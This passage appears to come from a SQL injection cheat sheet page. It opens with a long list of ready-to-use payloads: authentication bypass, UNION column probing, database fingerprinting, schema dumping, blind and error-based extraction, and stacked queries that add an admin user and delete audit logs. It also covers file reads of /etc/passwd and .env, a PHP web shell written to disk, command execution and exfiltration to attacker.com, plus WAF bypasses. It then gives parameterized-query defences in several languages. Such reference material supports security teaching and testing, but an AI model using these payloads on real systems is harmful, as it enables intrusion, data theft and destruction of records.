' OR 1=1 ORDER BY 1 --
'||(SELECT 1 FROM dual WHERE 1=1)--
' OR EXISTS(SELECT 1)--
' OR 1 LIKE 1 --
' OR 1 IN (1) --
' OR 'a' LIKE 'a

# === UNION SELECT — COLUMN DETECTION ===
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --
' ORDER BY 5 --
' ORDER BY 10 --
' ORDER BY 20 --
' ORDER BY 50 --
' ORDER BY 100 --
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT NULL,NULL,NULL,NULL --
' UNION SELECT NULL,NULL,NULL,NULL,NULL --
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --

# === DATABASE FINGERPRINTING ===
# MySQL
' UNION SELECT VERSION(),NULL --
' UNION SELECT @@version,NULL --
' UNION SELECT database(),NULL --
' UNION SELECT user(),NULL --

# PostgreSQL
' UNION SELECT version(),NULL --
' UNION SELECT current_database(),NULL --
' UNION SELECT current_user,NULL --

# MSSQL
' UNION SELECT @@version,NULL --
' UNION SELECT DB_NAME(),NULL --
' UNION SELECT SYSTEM_USER,NULL --

# Oracle
' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1 --
' UNION SELECT user,NULL FROM dual --

# SQLite
' UNION SELECT sqlite_version(),NULL --

# === DATA EXTRACTION — INFORMATION_SCHEMA ===
# All databases
' UNION SELECT GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata --
' UNION SELECT string_agg(datname,','),NULL FROM pg_database --
' UNION SELECT STRING_AGG(name,','),NULL FROM sys.databases --

# All tables
' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database() --
' UNION SELECT string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public' --
' UNION SELECT STRING_AGG(name,','),NULL FROM sysobjects WHERE xtype='U' --
' UNION SELECT GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table' --

# All columns
' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users' --

# === TIME-BASED BLIND ===
' AND SLEEP(5) --
' OR SLEEP(5) --
' AND IF(1=1,SLEEP(5),0) --
' AND IF(1=2,SLEEP(5),0) --
'; SELECT pg_sleep(5); --
'; WAITFOR DELAY '0:0:5'; --
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) --

# === BOOLEAN-BASED BLIND ===
' AND '1'='1
' AND '1'='2
' AND 1=1 --
' AND 1=2 --
' AND SUBSTRING(database(),1,1)='a' --
' AND ASCII(SUBSTRING(database(),1,1))>96 --
' AND (SELECT COUNT(*) FROM users)>0 --
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>0 --

# === ERROR-BASED ===
' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e)) --
' AND UPDATEXML(1,CONCAT(0x7e,database(),0x7e),1) --
' AND 1=CONVERT(INT,(SELECT DB_NAME())) --
' AND 1=CAST((SELECT version()) AS INT) --
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

# === STACKED QUERIES ===
'; INSERT INTO users VALUES(999,'hacker','hacked','hacker@evil.com','admin'); --
'; UPDATE users SET role='admin' WHERE username='attacker'; --
'; DELETE FROM audit_log; --

# === FILE OPERATIONS ===
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL --
' UNION SELECT LOAD_FILE('/var/www/html/.env'),NULL --
' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/cmd.php' --

# === COMMAND EXECUTION ===
'; EXEC xp_cmdshell 'whoami'; --
'; COPY (SELECT '') TO PROGRAM 'id'; --

# === OUT-OF-BAND ===
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a')),NULL --
'; EXEC master.dbo.xp_dirtree '\\attacker.com\x'; --
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user),NULL FROM dual --

# === WAF BYPASS ===
' /*!UNION*/ /*!SELECT*/ 1,2,3 --
' UN/**/ION SE/**/LECT 1,2,3 --
' uNiOn SeLeCt 1,2,3 --
'%20UNION%20SELECT%201,2,3--
' UNION%23%0aSELECT 1,2,3 --
'UNION(SELECT(1),(2),(3))--
'+UNION+SELECT+1,2,3--

# === NoSQL INJECTION ===
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
username[$ne]=x&password[$ne]=x
username=admin&password[$regex]=.*
```

::

---

## Mitigation & Prevention

::card-group
  ::card
  ---
  title: Parameterized Queries
  icon: i-lucide-shield-check
  ---
  **Always** use parameterized queries (prepared statements) with bound parameters. Never concatenate user input into SQL strings. This is the **#1 defense** against SQL injection.
  ::

  ::card
  ---
  title: ORM Usage
  icon: i-lucide-database
  ---
  Use Object-Relational Mappers (ORMs) like SQLAlchemy, Hibernate, Eloquent, or Prisma. They automatically parameterize queries and abstract raw SQL construction.
  ::

  ::card
  ---
  title: Input Validation
  icon: i-lucide-check-circle
  ---
  Validate and sanitize all input. Use allowlists for expected values (e.g., sort columns). Reject unexpected characters. Apply type checking — ensure numeric inputs are actually numbers.
  ::

  ::card
  ---
  title: Least Privilege
  icon: i-lucide-user-minus
  ---
  Database accounts used by applications should have **minimum required permissions**. Never use `root`/`sa`/`dba` accounts. Disable `FILE`, `xp_cmdshell`, `COPY PROGRAM`, and other dangerous features.
  ::

  ::card
  ---
  title: WAF + Defense in Depth
  icon: i-lucide-layers
  ---
  Deploy a Web Application Firewall as an additional layer. WAFs should supplement — never replace — secure coding. Use ModSecurity, Cloudflare WAF, or AWS WAF with SQL injection rules enabled.
  ::

  ::card
  ---
  title: Error Handling
  icon: i-lucide-alert-circle
  ---
  Never expose database error messages to users. Use generic error pages. Log detailed errors server-side only. Disable `display_errors` in production.
  ::
::

### Secure Code Examples

::code-group
```php [PHP — Parameterized Query (PDO)]
<?php
// SECURE — Using prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute([
    ':username' => $_POST['username'],
    ':password' => hash('sha256', $_POST['password'])
]);
$user = $stmt->fetch();

// SECURE — Product search
$stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE :search");
$stmt->execute([':search' => '%' . $_GET['q'] . '%']);
$products = $stmt->fetchAll();

// SECURE — Numeric parameter
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false) die('Invalid ID');
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$id]);

// SECURE — ORDER BY with allowlist
$allowed_sorts = ['id', 'name', 'price', 'created_at'];
$sort = in_array($_GET['sort'], $allowed_sorts) ? $_GET['sort'] : 'id';
$order = strtoupper($_GET['order']) === 'DESC' ? 'DESC' : 'ASC';
$stmt = $pdo->query("SELECT * FROM products ORDER BY $sort $order");
?>
```

```python [Python — Parameterized Query]
import psycopg2

# SECURE — PostgreSQL parameterized query
conn = psycopg2.connect(dsn)
cursor = conn.cursor()

# Never: f"SELECT * FROM users WHERE id = {user_id}"
# Always:
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
user = cursor.fetchone()

# SECURE — Search with LIKE
cursor.execute(
    "SELECT * FROM products WHERE name ILIKE %s",
    (f"%{search_term}%",)
)

# SECURE — SQLAlchemy ORM
from sqlalchemy import select
stmt = select(User).where(User.username == username)
result = session.execute(stmt).scalars().first()
```

```javascript [Node.js — Parameterized Query]
// SECURE — MySQL2 with parameterized queries
const [rows] = await pool.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, passwordHash]
);

// SECURE — PostgreSQL (pg)
const result = await pool.query(
  'SELECT * FROM products WHERE id = $1',
  [productId]
);

// SECURE — Prisma ORM
const user = await prisma.user.findFirst({
  where: {
    username: username,  // Automatically parameterized
    password: passwordHash
  }
});

// SECURE — ORDER BY with allowlist
const allowedSorts = ['id', 'name', 'price', 'created_at'];
const sort = allowedSorts.includes(req.query.sort) ? req.query.sort : 'id';
const order = req.query.order === 'desc' ? 'DESC' : 'ASC';
const [products] = await pool.query(
  `SELECT * FROM products ORDER BY ${sort} ${order}`
  // sort and order are validated against allowlist — safe
);
```

```java [Java — PreparedStatement]
// SECURE — JDBC PreparedStatement
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, username);
pstmt.setString(2, passwordHash);
ResultSet rs = pstmt.executeQuery();

// SECURE — JPA/Hibernate
TypedQuery<User> query = em.createQuery(
    "SELECT u FROM User u WHERE u.username = :username",
    User.class
);
query.setParameter("username", username);
User user = query.getSingleResult();

// SECURE — Spring Data JPA
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);
```

```csharp [C# — Parameterized Query]
// SECURE — ADO.NET SqlCommand
using var cmd = new SqlCommand(
    "SELECT * FROM Users WHERE Username = @username AND Password = @password",
    connection
);
cmd.Parameters.AddWithValue("@username", username);
cmd.Parameters.AddWithValue("@password", passwordHash);
using var reader = cmd.ExecuteReader();

// SECURE — Entity Framework
var user = context.Users
    .Where(u => u.Username == username && u.Password == passwordHash)
    .FirstOrDefault();

// SECURE — Dapper
var user = connection.QueryFirstOrDefault<User>(
    "SELECT * FROM Users WHERE Username = @Username",
    new { Username = username }
);
```

```ruby [Ruby — ActiveRecord / Sequel]
# SECURE — ActiveRecord
user = User.where(username: params[:username]).first
products = Product.where("name LIKE ?", "%#{params[:q]}%")

# SECURE — Sequel
user = DB[:users].where(username: params[:username]).first
products = DB[:products].where(Sequel.like(:name, "%#{params[:q]}%"))

# NEVER:
# User.where("username = '#{params[:username]}'")  ← VULNERABLE
```
::

::tip
The fundamental rule is simple: **never trust user input** and **never concatenate it into SQL queries**. Use parameterized queries everywhere, validate input types, apply least privilege to database accounts, and handle errors securely.
::